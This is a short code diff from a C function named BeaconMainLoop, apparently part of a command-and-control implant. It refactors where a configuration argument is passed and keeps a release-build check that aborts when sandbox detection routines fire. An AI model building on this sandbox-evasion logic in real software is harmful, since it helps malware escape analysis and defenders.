@@ -494,14 +494,14 @@ VOID BeaconMainLoop
 	}
 
 	for (i = 0; i < cProfiles; i++) {
-		pBeacon->lpClient = pBeacon->Init(ProfileList[i]);
+		pBeacon->lpClient = pBeacon->Init(pConfig, ProfileList[i]);
 #ifndef _DEBUG
 		if (DetectSandbox2() || DetectSandbox3()) {
 			goto CLEANUP;
 		}
 #endif
 
-		if (!pBeacon->Start(pConfig, pBeacon->lpClient)) {
+		if (!pBeacon->Start(pBeacon->lpClient)) {
 			goto CONTINUE;
 		}
 
